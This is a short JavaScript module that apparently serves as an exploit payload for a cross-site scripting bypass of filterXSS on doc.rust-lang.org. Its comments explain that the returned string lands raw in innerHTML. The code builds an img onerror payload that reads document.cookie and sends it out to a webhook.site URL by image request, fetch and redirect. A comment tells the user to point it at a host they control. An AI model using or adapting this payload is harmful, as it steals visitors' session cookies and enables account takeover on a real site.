// Remapped target of cs.js's `import N from 'http://localhost:3000/jsxss.js'`.
// Default export must be callable (cs.js calls window[N](location.href)).
// Return value becomes `previous`, later dropped RAW into innerHTML on
// doc.rust-lang.org -> filterXSS is fully bypassed.
//
// EDIT: set EXFIL to a host you control (webhook.site URL, your VPS, interactsh...).
const EXFIL = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';

const PAYLOAD =
  `<img src=x onerror="` +
    `var c=encodeURIComponent(document.cookie);` +
    `new Image().src='${EXFIL}/i?d='+c;` +
    `fetch('${EXFIL}/f?d='+c,{mode:'no-cors'}).catch(function(){});` +
    `setTimeout(function(){location.href='${EXFIL}/n?d='+c},800);` +
  `">`;

export default function () { return PAYLOAD; }
